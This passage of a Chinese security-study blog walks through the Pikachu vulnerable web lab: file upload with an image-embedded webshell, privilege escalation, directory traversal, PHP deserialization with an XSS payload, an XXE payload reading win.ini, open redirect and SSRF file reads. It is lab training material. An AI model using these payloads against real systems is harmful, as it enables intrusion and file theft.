class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>);</span><br><span class="line"><span class="variable">$save_path</span>=<span class="string">&#x27;uploads&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&#x27;/Y/m/d/&#x27;</span>);<span class="comment">//根据当天日期生成一个文件夹</span></span><br><span class="line"><span class="variable">$upload</span>=<span class="title function_ invoke__">upload</span>(<span class="string">&#x27;uploadfile&#x27;</span>,<span class="string">&#x27;512000&#x27;</span>,<span class="variable">$type</span>,<span class="variable">$mime</span>,<span class="variable">$save_path</span>);<span class="comment">//调用函数</span></span><br></pre></td></tr></table></figure><p>这题会检查图片的特征,所以我们直接在一张图片里隐写一个一句话木马像这样</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211202323504.png" alt="image-20221120232350409"></p><p>我们上传这张图片,发现可以上传成功,并且图片里有一句话木马,但是我们这样读取是以图片的形式读取,我们的一句话木马是没法执行的这时候有个比较巧妙的办法就是利用前边的文件包含去读取我们现在文件上传的目录<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211202327353.png" alt="image-20221120232738284"></p><h3 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h3><blockquote><p>如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。 越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的。</p><p>一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对 对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。</p><p>因此，在在权限管理中应该遵守：<br>1.使用最小权限原则对用户进行赋权;<br>2.使用合理（严格）的权限校验规则;<br>3.使用后台登录态作为条件进行权限判断,别动不动就瞎用前端传进来的条件;</p><p>你可以通过“Over permission”对应的测试栏目，来进一步的了解该漏洞。</p></blockquote><h4 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h4><p>这里我们先登录lucy的账号看一下<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202212271902953.png" alt="image-20221227190200821"></p><p>这里我们直接将url地址改成kobe试一下<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202212271904497.png" alt="image-20221227190421428"></p><p>显然, 我们成功访问到了kobe的所有信息</p><h4 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h4><p>我们先登录admin看一下, 可以发现admin是可以添加用户的<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202212271914258.png" alt="image-20221227191441192"></p><p>那我们用pikachu用户试一下能不能添加用户呢?</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202212271936671.png"></p><p>创建成功!</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202212271929329.png" alt="image-20221227192907295"></p><h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><blockquote><p>目录遍历漏洞概述</p><p>在web功能设计中,很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。 当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。 在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过“../”这样的手段让后台打开或者执行一些其他的文件。 从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。</p><p>看到这里,你可能会觉得目录遍历漏洞和不安全的文件下载，甚至文件包含漏洞有差不多的意思，是的，目录遍历漏洞形成的最主要的原因跟这两者一样，都是在功能设计中将要操作的文件使用变量的 方式传递给了后台，而又没有进行严格的安全考虑而造成的，只是出现的位置所展现的现象不一样，因此，这里还是单独拿出来定义一下。</p><p>需要区分一下的是,如果你通过不带参数的url（比如：<a class="link" target="_blank" rel="noopener" href="http://xxxx/doc%EF%BC%89%E5%88%97%E5%87%BA%E4%BA%86doc%E6%96%87%E4%BB%B6%E5%A4%B9%E9%87%8C%E9%9D%A2%E6%89%80%E6%9C%89%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E8%BF%99%E7%A7%8D%E6%83%85%E5%86%B5%EF%BC%8C%E6%88%91%E4%BB%AC%E6%88%90%E4%B8%BA%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E3%80%82">http://xxxx/doc）列出了doc文件夹里面所有的文件，这种情况，我们成为敏感信息泄露。<i class="fas fa-external-link-alt"></i></a> 而并不归为目录遍历漏洞。</p></blockquote><p>任意文件读取,直接相对路径读到<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202212271945093.png" alt="image-20221227194559038"></p><h3 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h3><blockquote><p>敏感信息泄露概述</p><p>由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。 比如：<br>—通过访问url下的目录，可以直接列出目录下的文件列表;<br>—输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;<br>—前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等;</p><p>类似以上这些情况，我们成为敏感信息泄露。敏感信息泄露虽然一直被评为危害比较低的漏洞，但这些敏感信息往往给攻击着实施进一步的攻击提供很大的帮助,甚至“离谱”的敏感信息泄露也会直接造成严重的损失。 因此,在web应用的开发上，除了要进行安全的代码编写，也需要注意对敏感信息的合理处理。</p></blockquote><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202212272021878.png" alt="image-20221227200726520"></p><p>直接相对目录读一下</p><h3 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h3><blockquote><p>在理解这个漏洞前,你需要先搞清楚php中serialize()，unserialize()这两个函数。</p><p><strong>序列化serialize()</strong><br>序列化说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>=<span class="string">&#x27;pikachu&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title function_ invoke__">S</span>(); <span class="comment">//创建一个对象</span></span><br><span class="line"><span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>); <span class="comment">//把这个对象进行序列化</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//运行结果 O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;</span></span><br><span class="line">O: 代表<span class="keyword">object</span></span><br><span class="line"><span class="number">1</span>: 代表对象名字长度为一个字符</span><br><span class="line">S: 对象名称</span><br><span class="line"><span class="number">1</span>: 代表对象里有一个变量</span><br><span class="line">s: 数据类型</span><br><span class="line"><span class="number">4</span>: 变量名称长度</span><br><span class="line">test: 变量名称</span><br><span class="line">s: 数据类型</span><br><span class="line"><span class="number">7</span>: 变量值长度</span><br><span class="line">pikachu: 变量值</span><br></pre></td></tr></table></figure><p><strong>反序列化unserialize()</strong></p><p>就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$u</span>=<span class="title function_ invoke__">unserialize</span>(<span class="string">&quot;O:1:&quot;</span>S<span class="string">&quot;:1:&#123;s:4:&quot;</span>test<span class="string">&quot;;s:7:&quot;</span>pikachu<span class="string">&quot;;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$u</span>-&gt;test; <span class="comment">//得到的结果为pikachu   </span></span><br></pre></td></tr></table></figure><p>序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">常见的几个魔法函数:</span><br><span class="line"><span class="title function_ invoke__">__construct</span>()当一个对象创建时被调用</span><br><span class="line"><span class="title function_ invoke__">__dostruct</span>() 当一个对象销毁时被调用</span><br><span class="line"><span class="title function_ invoke__">__toString</span>() 当一个对象被当作一个字符串使用</span><br><span class="line"><span class="title function_ invoke__">__sleep</span>() 在对象在被序列化之前运行</span><br><span class="line">__wakeup 将在序列化之后立即被调用</span><br><span class="line">漏洞举例:</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$__GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">@<span class="variable">$unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment">//payload: O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;</span></span><br></pre></td></tr></table></figure></blockquote><p>我们翻阅一下这题的源代码</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202212272048965.png" alt="image-20221227203107951"></p><p>最终代码成功利用与否提现在前端,索性我们就效仿上边生成一串xss</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>=<span class="string">&#x27;&lt;script&gt;alert(1)&lt;/script&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title function_ invoke__">S</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202212272048858.png" alt="image-20221227203459612"></p><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><blockquote><p>XXE -“xml external entity injection”<br>既”xml外部实体注入漏洞”。<br>概括一下就是”攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题”<br>也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。</p><p>具体的关于xml实体的介绍,网络上有很多,自己动手先查一下。<br>现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的,从而也就直接避免了这个漏洞。<br>以PHP为例,在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。</p><p>本章提供的案例中,为了模拟漏洞,通过手动指定LIBXML_NOENT选项开启了xml外部实体解析。</p></blockquote><p>我们首先使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY xxe  &quot;Charmersix&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&amp;xxe;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>发现在本地是有回显的, 这时候我们开始外部注入,试着访问一下我们电脑的<code>win.ini</code>文件(file协议只能绝对路径读取)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&amp;xxe;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202212281753645.png" alt="image-20221228175327565"></p><p>那么我们如果修改一下源码呢</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202212281807550.png" alt="image-20221228175412874"></p><p>先删掉<code>LIBXML_NOENT</code>试一试</p><p>我们可以发现<code>Charmersix</code>仍然可以回显,但是没法回显<code>win.ini</code>内容了</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202212281805813.png" alt="image-20221228180526781"></p><h3 id="URL重定向"><a href="#URL重定向" class="headerlink" title="URL重定向"></a>URL重定向</h3><blockquote><p>不安全的url跳转</p><p>不安全的url跳转问题可能发生在一切执行了url地址跳转的地方。<br>如果后端采用了前端传进来的(可能是用户传参,或者之前预埋在前端页面的url地址)参数作为了跳转的目的地,而又没有做判断的话<br>就可能发生”跳错对象”的问题。</p><p>url跳转比较直接的危害是:<br>–&gt;钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站</p><p>这个漏洞比较简单,come on,来测一把!</p></blockquote><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202212272052281.png" alt="image-20221227205241228"></p><p>成功跳转到myblog</p><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><blockquote><p><strong>SSRF(Server-Side Request Forgery:服务器端请求伪造)</strong></p><p>其形成的原因大都是由于服务端<strong>提供了从其他服务器应用获取数据的功能</strong>,但又没有对目标地址做严格过滤与限制</p><p>导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据</p><p>数据流:攻击者—–&gt;服务器—-&gt;目标地址</p><p>根据后台使用的函数的不同,对应的影响和利用方法又有不一样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PHP中下面函数的使用不当会导致SSRF:</span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>()</span><br><span class="line"><span class="title function_ invoke__">fsockopen</span>()</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>()</span><br></pre></td></tr></table></figure><p>如果一定要通过后台服务器远程去对用户指定(“或者预埋在前端的请求”)的地址进行资源请求,<strong>则请做好目标地址的过滤</strong>。</p><p>你可以根据”SSRF”里面的项目来搞懂问题的原因</p></blockquote><h4 id="SSRF-curl"><a href="#SSRF-curl" class="headerlink" title="SSRF(curl)"></a>SSRF(curl)</h4><p>首先我们可以效仿上一题,通过http协议,url重定向到其他页面<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202212281901614.png" alt="image-20221228182437601"></p><p>我们也可以效仿上上个漏洞,通过file协议读取一些我们想要的文件</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202212281916505.png" alt="image-20221228191611449"></p><p>或者是像这样<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202212281955376.png" alt="image-20221228195527319"></p><h4 id="SSRF-file-get-contents"><a href="#SSRF-file-get-contents" class="headerlink" title="SSRF(file_get_contents)"></a>SSRF(file_get_contents)</h4><p>仍然可以<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202212282118622.png" alt="image-20221228211830567"></p><h3 id="全剧终"><a href="#全剧终" class="headerlink" title="全剧终"></a>全剧终</h3></div><ul class="post-tags-box"><li class="tag-item"><a href="/tags/Web/">#Web</a>&nbsp;</li><li class="tag-item"><a href="/tags/study/">#study</a>&nbsp;</li><li class="tag-item"><a href="/tags/pikachu/">#pikachu</a>&nbsp;</li></ul><div class="article-nav"><div class="article-prev"><a class="prev" rel="prev" href="/2022/09/02/web_1/"><span class="left arrow-icon flex-center"><i class="fas fa-chevron-left"></i> </span><span class="title flex-center"><span class="post-nav-title-item">Web_1_简单信息搜集+burp基本使用</span> <span class="post-nav-item">Prev posts</span></span></a></div><div class="article-next"><a class="next" rel="next" href="/2022/08/26/CSRF/"><span class="title flex-center"><span class="post-nav-title-item">Web_CSRF</span> <span class="post-nav-item">Next posts</span> </span><span class="right arrow-icon flex-center"><i class="fas fa-chevron-right"></i></span></a></div></div><div class="comment-container"><div class="comments-container"><div id="comments-anchor"></div><div class="comment-area-title"><i class="fas fa-comments"></i>&nbsp;Comments</div><div class="waline-comment-container"><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline-meta.css"><script src="//unpkg.com/@waline/client@v2/dist/waline.js"></script><div id="waline-comment"></div><script>function loadWaline(){Waline.init({el:"#waline-comment",serverURL:"https://waline-charmersix.vercel.app/",lang:"en",comment:".post-comments-count",reaction:!0})}window.addEventListener("DOMContentLoaded",loadWaline)</script></div></div></div></div><div class="toc-content-container"><div class="post-toc-wrap"><div class="post-toc"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%B6%E5%9C%BA%E5%AE%89%E8%A3%85"><span class="nav-number">1.</span> <span class="nav-text">靶场安装</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="nav-number">2.</span> <span class="nav-text">暴力破解</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="nav-number">2.1.</span> <span class="nav-text">基于表单的暴力破解</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-on-server"><span class="nav-number">2.2.</span> <span class="nav-text">验证码绕过(on server)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-on-client"><span class="nav-number">2.3.</span> <span class="nav-text">验证码绕过(on client)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#token%E9%98%B2%E7%88%86%E7%A0%B4"><span class="nav-number">2.4.</span> <span class="nav-text">token防爆破?</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS"><span class="nav-number">3.</span> <span class="nav-text">XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss-get"><span class="nav-number">3.1.</span> <span class="nav-text">反射型xss(get)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss-post"><span class="nav-number">3.2.</span> <span class="nav-text">反射型xss(post)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss"><span class="nav-number">3.3.</span> <span class="nav-text">存储型xss</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DOM%E5%9E%8Bxss"><span class="nav-number">3.4.</span> <span class="nav-text">DOM型xss</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DOM%E5%9E%8Bxss-x"><span class="nav-number">3.5.</span> <span class="nav-text">DOM型xss-x</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#xss%E4%B9%8B%E7%9B%B2%E6%89%93"><span class="nav-number">3.6.</span> <span class="nav-text">xss之盲打</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#xss%E4%B9%8B%E8%BF%87%E6%BB%A4"><span class="nav-number">3.7.</span> <span class="nav-text">xss之过滤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#xss%E4%B9%8Bhtmlspecialchars"><span class="nav-number">3.8.</span> <span class="nav-text">xss之htmlspecialchars</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#xss%E4%B9%8Bhref%E8%BE%93%E5%87%BA"><span class="nav-number">3.9.</span> <span class="nav-text">xss之href输出</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#xss%E4%B9%8Bjs%E8%BE%93%E5%87%BA"><span class="nav-number">3.10.</span> <span class="nav-text">xss之js输出</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E8%8A%9D%E5%A3%AB"><span class="nav-number">3.11.</span> <span class="nav-text">前置芝士</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#JavaScript%E5%8D%8F%E8%AE%AE"><span class="nav-number">3.11.1.</span> <span class="nav-text">JavaScript协议</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">3.11.1.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%89%B9%E7%82%B9"><span class="nav-number">3.11.1.2.</span> <span class="nav-text">特点</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%94%A8%E9%80%94"><span class="nav-number">3.11.1.3.</span> <span class="nav-text">用途</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#beef"><span class="nav-number">3.11.2.</span> <span class="nav-text">beef</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%AE%89%E8%A3%85"><span class="nav-number">3.11.2.1.</span> <span class="nav-text">安装</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B-1"><span class="nav-number">3.11.2.2.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8"><span class="nav-number">3.11.2.3.</span> <span class="nav-text">使用</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF"><span class="nav-number">4.</span> <span class="nav-text">CSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#CSRF-get"><span class="nav-number">4.1.</span> <span class="nav-text">CSRF(get)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CSRF-post"><span class="nav-number">4.2.</span> <span class="nav-text">CSRF(post)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CSRF-Token"><span class="nav-number">4.3.</span> <span class="nav-text">CSRF Token</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Sql-Inject-SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">5.</span> <span class="nav-text">Sql Inject(SQL注入)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">5.1.</span> <span class="nav-text">数字型注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">5.2.</span> <span class="nav-text">字符型注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">5.3.</span> <span class="nav-text">搜索型注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#xxx%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">5.4.</span> <span class="nav-text">xxx型注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E2%80%9Cinsert-update%E2%80%9D%E6%B3%A8%E5%85%A5"><span class="nav-number">5.5.</span> <span class="nav-text">“insert&#x2F;update”注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E2%80%9Cdelete%E2%80%9D%E6%B3%A8%E5%85%A5"><span class="nav-number">5.6.</span> <span class="nav-text">“delete”注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#http%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="nav-number">5.7.</span> <span class="nav-text">http头注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8Eboolian%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="nav-number">5.8.</span> <span class="nav-text">基于boolian的盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8"><span class="nav-number">5.9.</span> <span class="nav-text">基于时间的盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-number">5.10.</span> <span class="nav-text">宽字节注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQLmap"><span class="nav-number">6.</span> <span class="nav-text">SQLmap</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5-1"><span class="nav-number">6.1.</span> <span class="nav-text">数字型注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5-1"><span class="nav-number">6.2.</span> <span class="nav-text">字符型注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5-1"><span class="nav-number">6.3.</span> <span class="nav-text">搜索型注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#xxx%E5%9E%8B%E6%B3%A8%E5%85%A5-1"><span class="nav-number">6.4.</span> <span class="nav-text">xxx型注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E2%80%9Cinsert-update%E2%80%9D%E6%B3%A8%E5%85%A5-1"><span class="nav-number">6.5.</span> <span class="nav-text">“insert&#x2F;update”注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E2%80%9Cdelete%E2%80%9D%E6%B3%A8%E5%85%A5-1"><span class="nav-number">6.6.</span> <span class="nav-text">“delete”注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#http%E5%A4%B4%E6%B3%A8%E5%85%A5-1"><span class="nav-number">6.7.</span> <span class="nav-text">http头注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8Eboolian%E7%9A%84%E7%9B%B2%E6%B3%A8-1"><span class="nav-number">6.8.</span> <span class="nav-text">基于boolian的盲注</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RCE"><span class="nav-number">7.</span> <span class="nav-text">RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#exec-%E2%80%9Cping%E2%80%9D"><span class="nav-number">7.1.</span> <span class="nav-text">exec “ping”</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exec-%E2%80%9Ceval%E2%80%9D"><span class="nav-number">7.2.</span> <span class="nav-text">exec “eval”</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">8.</span> <span class="nav-text">文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">8.1.</span> <span 